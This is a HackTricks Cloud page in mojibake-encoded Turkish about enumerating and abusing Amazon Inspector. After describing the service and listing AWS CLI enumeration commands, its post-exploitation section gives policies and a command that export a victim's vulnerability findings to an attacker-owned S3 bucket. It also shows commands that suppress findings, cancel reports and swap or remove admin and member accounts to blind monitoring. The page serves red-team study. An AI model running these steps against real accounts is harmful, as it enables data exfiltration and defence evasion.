# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}

### Inspector

Amazon Inspector, AWS ortamÄ±nÄ±zÄ±n gÃ¼venliÄŸini artÄ±rmak iÃ§in tasarlanmÄ±ÅŸ geliÅŸmiÅŸ, otomatik bir zafiyet yÃ¶netim hizmetidir. Bu hizmet, Amazon EC2 Ã¶rneklerini, Amazon ECR'deki konteyner gÃ¶rÃ¼ntÃ¼lerini, Amazon ECS'yi ve AWS Lambda iÅŸlevlerini sÃ¼rekli olarak zafiyetler ve istenmeyen aÄŸ maruziyeti iÃ§in tarar. GÃ¼Ã§lÃ¼ bir zafiyet istihbarat veritabanÄ±ndan yararlanarak, Amazon Inspector, ciddiyet seviyeleri ve dÃ¼zeltme Ã¶nerileri dahil olmak Ã¼zere ayrÄ±ntÄ±lÄ± bulgular sunar ve kuruluÅŸlarÄ±n gÃ¼venlik risklerini proaktif bir ÅŸekilde tanÄ±mlayÄ±p ele almasÄ±na yardÄ±mcÄ± olur. Bu kapsamlÄ± yaklaÅŸÄ±m, Ã§eÅŸitli AWS hizmetleri arasÄ±nda gÃ¼Ã§lendirilmiÅŸ bir gÃ¼venlik duruÅŸu saÄŸlar ve uyum ve risk yÃ¶netimine yardÄ±mcÄ± olur.

### Ana unsurlar

#### Bulgular

Amazon Inspector'daki bulgular, EC2 Ã¶rneklerinin, ECR depolarÄ±nÄ±n veya Lambda iÅŸlevlerinin taranmasÄ± sÄ±rasÄ±nda keÅŸfedilen zafiyetler ve maruziyetler hakkÄ±nda ayrÄ±ntÄ±lÄ± raporlardÄ±r. Durumuna gÃ¶re, bulgular ÅŸu ÅŸekilde kategorize edilir:

* **Aktif**: Bulgu dÃ¼zeltilmemiÅŸtir.
* **KapalÄ±**: Bulgu dÃ¼zeltilmiÅŸtir.
* **BaskÄ±lanmÄ±ÅŸ**: Bulgu, bir veya daha fazla **baskÄ±lama kuralÄ±** nedeniyle bu durumla iÅŸaretlenmiÅŸtir.

Bulgular ayrÄ±ca Ã¼Ã§ tÃ¼rde kategorize edilir:

* **Paket**: Bu bulgular, kaynaklarÄ±nÄ±zda kurulu yazÄ±lÄ±m paketlerindeki zafiyetlerle ilgilidir. Ã–rnekler arasÄ±nda gÃ¼ncel olmayan kÃ¼tÃ¼phaneler veya bilinen gÃ¼venlik sorunlarÄ± olan baÄŸÄ±mlÄ±lÄ±klar bulunur.
* **Kod**: Bu kategori, AWS kaynaklarÄ±nÄ±zda Ã§alÄ±ÅŸan uygulamalarÄ±n kodunda bulunan zafiyetleri iÃ§erir. YaygÄ±n sorunlar, gÃ¼venlik ihlallerine yol aÃ§abilecek kodlama hatalarÄ± veya gÃ¼vensiz uygulamalardÄ±r.
* **AÄŸ**: AÄŸ bulgularÄ±, saldÄ±rganlar tarafÄ±ndan istismar edilebilecek aÄŸ yapÄ±landÄ±rmalarÄ±ndaki potansiyel maruziyetleri tanÄ±mlar. Bunlar arasÄ±nda aÃ§Ä±k portlar, gÃ¼vensiz aÄŸ protokolleri ve yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ gÃ¼venlik gruplarÄ± bulunur.

#### Filtreler ve BaskÄ±lama KurallarÄ±

Amazon Inspector'daki filtreler ve baskÄ±lama kurallarÄ±, bulgularÄ± yÃ¶netmeye ve Ã¶nceliklendirmeye yardÄ±mcÄ± olur. Filtreler, bulgularÄ± ciddiyet veya kaynak tÃ¼rÃ¼ gibi belirli kriterlere gÃ¶re daraltmanÄ±za olanak tanÄ±r. BaskÄ±lama kurallarÄ±, dÃ¼ÅŸÃ¼k risk olarak kabul edilen, zaten hafifletilmiÅŸ veya baÅŸka Ã¶nemli bir nedenle baskÄ±lanmasÄ± gereken belirli bulgularÄ± baskÄ±lamanÄ±za olanak tanÄ±r; bu, gÃ¼venlik raporlarÄ±nÄ±zÄ± aÅŸÄ±rÄ± yÃ¼klenmekten korur ve daha kritik sorunlara odaklanmanÄ±zÄ± saÄŸlar.

#### YazÄ±lÄ±m Malzeme Listesi (SBOM)

Amazon Inspector'daki YazÄ±lÄ±m Malzeme Listesi (SBOM), bir yazÄ±lÄ±m paketinin iÃ§indeki tÃ¼m bileÅŸenleri, kÃ¼tÃ¼phaneler ve baÄŸÄ±mlÄ±lÄ±klar dahil olmak Ã¼zere ayrÄ±ntÄ±lÄ± bir ÅŸekilde listeleyen dÄ±ÅŸa aktarÄ±labilir bir envanter listesidir. SBOM'lar, yazÄ±lÄ±m tedarik zincirine ÅŸeffaflÄ±k saÄŸlamaya yardÄ±mcÄ± olur ve daha iyi zafiyet yÃ¶netimi ve uyum saÄŸlar. AÃ§Ä±k kaynak ve Ã¼Ã§Ã¼ncÃ¼ taraf yazÄ±lÄ±m bileÅŸenleriyle iliÅŸkili riskleri tanÄ±mlamak ve hafifletmek iÃ§in kritik Ã¶neme sahiptir.

### Ana Ã¶zellikler

#### BulgularÄ± DÄ±ÅŸa Aktarma

Amazon Inspector, bulgularÄ± Amazon S3 Buckets, Amazon EventBridge ve AWS Security Hub'a dÄ±ÅŸa aktarma yeteneÄŸi sunar; bu, belirli bir tarih ve saatte tanÄ±mlanan zafiyetler ve maruziyetler hakkÄ±nda ayrÄ±ntÄ±lÄ± raporlar oluÅŸturmanÄ±za olanak tanÄ±r. Bu Ã¶zellik, CSV ve JSON gibi Ã§eÅŸitli Ã§Ä±ktÄ± formatlarÄ±nÄ± destekler ve diÄŸer araÃ§lar ve sistemlerle entegrasyonu kolaylaÅŸtÄ±rÄ±r. DÄ±ÅŸa aktarma iÅŸlevi, raporlara dahil edilen verilerin Ã¶zelleÅŸtirilmesine olanak tanÄ±r; bu, bulgularÄ± ciddiyet, kaynak tÃ¼rÃ¼ veya tarih aralÄ±ÄŸÄ± gibi belirli kriterlere gÃ¶re filtrelemenizi saÄŸlar ve varsayÄ±lan olarak mevcut AWS BÃ¶lgesi'ndeki tÃ¼m bulgularÄ±nÄ±zÄ± Aktif durumla dahil eder.

BulgularÄ± dÄ±ÅŸa aktarÄ±rken, verileri dÄ±ÅŸa aktarÄ±m sÄ±rasÄ±nda ÅŸifrelemek iÃ§in bir Anahtar YÃ¶netim Hizmeti (KMS) anahtarÄ± gereklidir. KMS anahtarlarÄ±, dÄ±ÅŸa aktarÄ±lan bulgularÄ±n yetkisiz eriÅŸime karÅŸÄ± korunmasÄ±nÄ± saÄŸlar ve hassas zafiyet bilgileri iÃ§in ekstra bir gÃ¼venlik katmanÄ± saÄŸlar.

#### Amazon EC2 Ã¶rneklerinin taranmasÄ±

Amazon Inspector, zafiyetleri ve gÃ¼venlik sorunlarÄ±nÄ± tespit etmek iÃ§in Amazon EC2 Ã¶rnekleri iÃ§in gÃ¼Ã§lÃ¼ tarama yetenekleri sunar. Inspector, EC2 Ã¶rneÄŸinden Ã§Ä±karÄ±lan meta verileri, paket zafiyetleri ve aÄŸ eriÅŸilebilirlik sorunlarÄ± Ã¼retmek iÃ§in gÃ¼venlik tavsiyelerindeki kurallarla karÅŸÄ±laÅŸtÄ±rÄ±r. Bu taramalar, hesabÄ±nÄ±zÄ±n **tarama modu** ayarlarÄ±na baÄŸlÄ± olarak **ajan tabanlÄ±** veya **ajansÄ±z** yÃ¶ntemlerle gerÃ§ekleÅŸtirilebilir.

* **Ajan TabanlÄ±**: Derinlemesine taramalar gerÃ§ekleÅŸtirmek iÃ§in AWS Sistem YÃ¶neticisi (SSM) ajanÄ±nÄ± kullanÄ±r. Bu yÃ¶ntem, Ã¶rnekten doÄŸrudan kapsamlÄ± veri toplama ve analiz yapma olanaÄŸÄ± saÄŸlar.
* **AjansÄ±z**: Ã–rnekte bir ajan kurulumunu gerektirmeyen hafif bir alternatif sunar; her EC2 Ã¶rneÄŸinin her bir hacminin EBS anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r, zafiyetleri arar ve ardÄ±ndan siler; mevcut AWS altyapÄ±sÄ±nÄ± tarama iÃ§in kullanÄ±r.

Tarama modu, EC2 taramalarÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in hangi yÃ¶ntemin kullanÄ±lacaÄŸÄ±nÄ± belirler:

* **Ajan TabanlÄ±**: Derin inceleme iÃ§in EC2 Ã¶rneklerine SSM ajanÄ±nÄ±n kurulmasÄ±nÄ± iÃ§erir.
* **Hibrit Tarama**: KapsamÄ± maksimize etmek ve performans etkisini en aza indirmek iÃ§in hem ajan tabanlÄ± hem de ajansÄ±z yÃ¶ntemleri birleÅŸtirir. SSM ajanÄ±nÄ±n kurulu olduÄŸu EC2 Ã¶rneklerinde, Inspector ajan tabanlÄ± bir tarama gerÃ§ekleÅŸtirecek ve SSM ajanÄ±nÄ±n olmadÄ±ÄŸÄ±larda ajansÄ±z bir tarama yapÄ±lacaktÄ±r.

Bir diÄŸer Ã¶nemli Ã¶zellik, EC2 Linux Ã¶rnekleri iÃ§in **derin inceleme**dir. Bu Ã¶zellik, EC2 Linux Ã¶rneklerinin yazÄ±lÄ±mÄ± ve yapÄ±landÄ±rmasÄ±nÄ± kapsamlÄ± bir ÅŸekilde analiz eder, iÅŸletim sistemi zafiyetleri, uygulama zafiyetleri ve yanlÄ±ÅŸ yapÄ±landÄ±rmalar dahil olmak Ã¼zere ayrÄ±ntÄ±lÄ± zafiyet deÄŸerlendirmeleri saÄŸlar ve kapsamlÄ± bir gÃ¼venlik deÄŸerlendirmesi sunar. Bu, **Ã¶zel yollarÄ±n** ve tÃ¼m alt dizinlerinin incelenmesi yoluyla gerÃ§ekleÅŸtirilir. VarsayÄ±lan olarak, Amazon Inspector aÅŸaÄŸÄ±dakileri tarar, ancak her Ã¼ye hesap 5'e kadar Ã¶zel yol tanÄ±mlayabilir ve her delege edilmiÅŸ yÃ¶netici 10'a kadar tanÄ±mlayabilir:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR konteyner gÃ¶rÃ¼ntÃ¼lerinin taranmasÄ±

Amazon Inspector, Amazon Elastic Container Registry (ECR) konteyner gÃ¶rÃ¼ntÃ¼leri iÃ§in gÃ¼Ã§lÃ¼ tarama yetenekleri sunar ve paket zafiyetlerinin etkili bir ÅŸekilde tespit edilmesini ve yÃ¶netilmesini saÄŸlar.

* **Temel Tarama**: Bu, konteyner gÃ¶rÃ¼ntÃ¼lerindeki bilinen iÅŸletim sistemi paketleri zafiyetlerini tanÄ±mlayan hÄ±zlÄ± ve hafif bir taramadÄ±r; aÃ§Ä±k kaynak Clair projesinden standart bir kural seti kullanÄ±r. Bu tarama yapÄ±landÄ±rmasÄ±yla, depolarÄ±nÄ±z itme sÄ±rasÄ±nda veya manuel taramalar gerÃ§ekleÅŸtirildiÄŸinde taranacaktÄ±r.
* **GeliÅŸmiÅŸ Tarama**: Bu seÃ§enek, itme taramasÄ±na ek olarak sÃ¼rekli tarama Ã¶zelliÄŸini ekler. GeliÅŸmiÅŸ tarama, her konteyner gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n katmanlarÄ±na daha derinlemesine dalarak iÅŸletim sistemi paketlerindeki ve programlama dilleri paketlerindeki zafiyetleri daha yÃ¼ksek bir doÄŸrulukla tanÄ±mlar. Hem temel gÃ¶rÃ¼ntÃ¼yÃ¼ hem de ek katmanlarÄ± analiz ederek potansiyel gÃ¼venlik sorunlarÄ±nÄ±n kapsamlÄ± bir gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ saÄŸlar.

#### Amazon Lambda iÅŸlevlerinin taranmasÄ±

Amazon Inspector, AWS Lambda iÅŸlevleri ve katmanlarÄ± iÃ§in kapsamlÄ± tarama yetenekleri iÃ§erir ve sunucusuz uygulamalarÄ±n gÃ¼venliÄŸini ve bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ saÄŸlar. Inspector, Lambda iÅŸlevleri iÃ§in iki tÃ¼r tarama sunar:

* **Lambda standart taramasÄ±**: Bu varsayÄ±lan Ã¶zellik, Lambda iÅŸlevinize ve katmanlarÄ±nÄ±za eklenen yazÄ±lÄ±m zafiyetlerini tanÄ±mlar. Ã–rneÄŸin, iÅŸleviniz bilinen bir zafiyeti olan python-jwt kÃ¼tÃ¼phanesinin bir sÃ¼rÃ¼mÃ¼nÃ¼ kullanÄ±yorsa, bir bulgu oluÅŸturur.
* **Lambda kod taramasÄ±**: Ã–zel uygulama kodunu gÃ¼venlik sorunlarÄ± iÃ§in analiz eder, enjeksiyon hatalarÄ±, veri sÄ±zÄ±ntÄ±larÄ±, zayÄ±f kriptografi ve eksik ÅŸifreleme gibi zafiyetleri tespit eder. Tespit edilen zafiyetleri vurgulayan kod parÃ§acÄ±klarÄ±nÄ± yakalar, Ã¶rneÄŸin, sabit kodlanmÄ±ÅŸ kimlik bilgileri. Bulgular, sorunlarÄ± dÃ¼zeltmek iÃ§in ayrÄ±ntÄ±lÄ± dÃ¼zeltme Ã¶nerileri ve kod parÃ§acÄ±klarÄ± iÃ§erir.

#### **Ä°nternet GÃ¼venliÄŸi Merkezi (CIS) taramalarÄ±**

Amazon Inspector, Amazon EC2 Ã¶rnek iÅŸletim sistemlerini Ä°nternet GÃ¼venliÄŸi Merkezi (CIS) tarafÄ±ndan Ã¶nerilen en iyi uygulama Ã¶nerilerine karÅŸÄ± deÄŸerlendirmek iÃ§in CIS taramalarÄ± iÃ§erir. Bu taramalar, yapÄ±landÄ±rmalarÄ±n endÃ¼stri standart gÃ¼venlik temel Ã§izgilerine uyduÄŸundan emin olur.

* **YapÄ±landÄ±rma**: CIS taramalarÄ±, sistem yapÄ±landÄ±rmalarÄ±nÄ±n belirli CIS Benchmark Ã¶nerilerini karÅŸÄ±layÄ±p karÅŸÄ±lamadÄ±ÄŸÄ±nÄ± deÄŸerlendirir; her kontrol, bir CIS kontrol kimliÄŸi ve baÅŸlÄ±ÄŸÄ± ile baÄŸlantÄ±lÄ±dÄ±r.
* **Uygulama**: Taramalar, Ã¶rnek etiketlerine ve tanÄ±mlÄ± takvimlere gÃ¶re gerÃ§ekleÅŸtirilir veya planlanÄ±r.
* **SonuÃ§lar**: Tarama sonrasÄ± sonuÃ§lar, hangi kontrollerin geÃ§tiÄŸini, atlandÄ±ÄŸÄ±nÄ± veya baÅŸarÄ±sÄ±z olduÄŸunu gÃ¶sterir ve her Ã¶rneÄŸin gÃ¼venlik duruÅŸu hakkÄ±nda bilgi saÄŸlar.

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploitation

{% hint style="success" %}
Bir saldÄ±rganÄ±n perspektifinden, bu hizmet, saldÄ±rgana diÄŸer Ã¶rnekleri/konteynerleri tehlikeye atmasÄ±na yardÄ±mcÄ± olabilecek zayÄ±flÄ±klarÄ± ve aÄŸ maruziyetlerini bulmasÄ±na yardÄ±mcÄ± olabilir.

Ancak, bir saldÄ±rgan bu hizmeti kesintiye uÄŸratmakla da ilgilenebilir, bÃ¶ylece kurban zayÄ±flÄ±klarÄ± gÃ¶remez (tÃ¼m veya belirli olanlar).
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Bir saldÄ±rgan, zayÄ±flÄ±klarÄ±n veya yazÄ±lÄ±m malzeme listelerinin (SBOM) ayrÄ±ntÄ±lÄ± raporlarÄ±nÄ± oluÅŸturabilir ve bunlarÄ± AWS ortamÄ±nÄ±zdan dÄ±ÅŸarÄ± aktarabilir. Bu bilgi, belirli zayÄ±flÄ±klarÄ±, gÃ¼ncel olmayan yazÄ±lÄ±mlarÄ± veya gÃ¼vensiz baÄŸÄ±mlÄ±lÄ±klarÄ± tanÄ±mlamak iÃ§in kullanÄ±labilir ve hedefli saldÄ±rÄ±lara olanak tanÄ±r.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
1. **Bir Amazon S3 Bucket oluÅŸturun** ve kurban Amazon Inspector'dan eriÅŸilebilir olmasÄ± iÃ§in ona bir politika ekleyin:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Bir Amazon KMS anahtarÄ± oluÅŸturun** ve kurbanÄ±n Amazon Inspector'Ã¼ tarafÄ±ndan kullanÄ±labilmesi iÃ§in ona bir politika ekleyin:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **Bulgular raporunu oluÅŸturma** komutunu Ã§alÄ±ÅŸtÄ±rarak dÄ±ÅŸarÄ± aktarÄ±n:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **Potansiyel Etki**: DetaylÄ± zafiyet ve yazÄ±lÄ±m raporlarÄ±nÄ±n Ã¼retilmesi ve dÄ±ÅŸa aktarÄ±lmasÄ±, belirli zafiyetler ve gÃ¼venlik zayÄ±flÄ±klarÄ± hakkÄ±nda iÃ§gÃ¶rÃ¼ler elde edilmesi.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Bir saldÄ±rgan, belirtilen bulgular raporunun veya SBOM raporunun Ã¼retilmesini iptal edebilir, bu da gÃ¼venlik ekiplerinin zafiyetler ve yazÄ±lÄ±m malzeme listeleri (SBOM'lar) hakkÄ±nda zamanÄ±nda bilgi almasÄ±nÄ± engelleyerek gÃ¼venlik sorunlarÄ±nÄ±n tespitini ve dÃ¼zeltmesini geciktirebilir.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **Potansiyel Etki**: GÃ¼venlik izleme sisteminin kesintiye uÄŸramasÄ± ve gÃ¼venlik sorunlarÄ±nÄ±n zamanÄ±nda tespit edilmesi ve giderilmesini engelleme.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Bu izinlere sahip bir saldÄ±rgan, hangi zafiyetlerin ve gÃ¼venlik sorunlarÄ±nÄ±n raporlanacaÄŸÄ±nÄ± veya bastÄ±rÄ±lacaÄŸÄ±nÄ± belirleyen filtreleme kurallarÄ±nÄ± manipÃ¼le edebilir (eÄŸer **action** SUPPRESS olarak ayarlandÄ±ysa, bir bastÄ±rma kuralÄ± oluÅŸturulacaktÄ±r). Bu, gÃ¼venlik yÃ¶neticilerinden kritik zafiyetleri gizleyerek, bu zayÄ±flÄ±klarÄ± tespit edilmeden istismar etmeyi kolaylaÅŸtÄ±rabilir. Ã–nemli filtreleri deÄŸiÅŸtirerek veya kaldÄ±rarak, bir saldÄ±rgan ayrÄ±ca sistemi alakasÄ±z bulgularla doldurarak gÃ¼rÃ¼ltÃ¼ yaratabilir ve etkili gÃ¼venlik izleme ve yanÄ±tÄ± engelleyebilir.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **Potansiyel Etki**: Kritik zafiyetlerin gizlenmesi veya bastÄ±rÄ±lmasÄ± ya da sistemi alakasÄ±z bulgularla doldurma.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Bir saldÄ±rgan, gÃ¼venlik yÃ¶netim yapÄ±sÄ±nÄ± Ã¶nemli Ã¶lÃ§Ã¼de bozabilir.

* Delegated admin hesabÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakarak, saldÄ±rgan gÃ¼venlik ekibinin Amazon Inspector ayarlarÄ±na ve raporlarÄ±na eriÅŸimini ve yÃ¶netimini engelleyebilir.
* Yetkisiz bir admin hesabÄ±nÄ±n etkinleÅŸtirilmesi, saldÄ±rgana gÃ¼venlik yapÄ±landÄ±rmalarÄ±nÄ± kontrol etme imkanÄ± tanÄ±r; bu, taramalarÄ± devre dÄ±ÅŸÄ± bÄ±rakma veya kÃ¶tÃ¼ niyetli faaliyetleri gizlemek iÃ§in ayarlarÄ± deÄŸiÅŸtirme potansiyeline sahiptir.

{% hint style="warning" %}
Yetkisiz hesabÄ±n, kurbanla aynÄ± Organizasyonda olmasÄ±, delegated administrator olmasÄ± iÃ§in gereklidir.

Yetkisiz hesabÄ±n delegated administrator olmasÄ± iÃ§in, Ã¶nce meÅŸru delegated administrator devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ± ve ardÄ±ndan yetkisiz hesap delegated administrator olarak etkinleÅŸtirilmeden Ã¶nce, meÅŸru administrator organizasyondan delegated administrator olarak kayÄ±ttan silinmelidir. Bu, aÅŸaÄŸÄ±daki komutla yapÄ±labilir (**`organizations:DeregisterDelegatedAdministrator`** izni gereklidir): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **Potansiyel Etki**: GÃ¼venlik yÃ¶netiminin kesintiye uÄŸramasÄ±.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Bir saldÄ±rgan, Amazon Inspector organizasyonu iÃ§indeki Ã¼ye hesaplarÄ±nÄ±n iliÅŸkilendirilmesini manipÃ¼le edebilir. Yetkisiz hesaplarÄ± iliÅŸkilendirerek veya meÅŸru olanlarÄ± iliÅŸkilendirmeyerek, bir saldÄ±rgan gÃ¼venlik taramalarÄ±na ve raporlamaya hangi hesaplarÄ±n dahil edileceÄŸini kontrol edebilir. Bu, kritik hesaplarÄ±n gÃ¼venlik izlemelerinden hariÃ§ tutulmasÄ±na yol aÃ§abilir ve saldÄ±rganÄ±n bu hesaplardaki zafiyetleri tespit edilmeden istismar etmesine olanak tanÄ±yabilir.

{% hint style="warning" %}
Bu iÅŸlem, yetkilendirilmiÅŸ yÃ¶netici tarafÄ±ndan gerÃ§ekleÅŸtirilmelidir.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **Potansiyel Etki**: Ana hesaplarÄ±n gÃ¼venlik taramalarÄ±ndan hariÃ§ tutulmasÄ±, zafiyetlerin tespit edilmeden istismar edilmesine olanak tanÄ±r.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

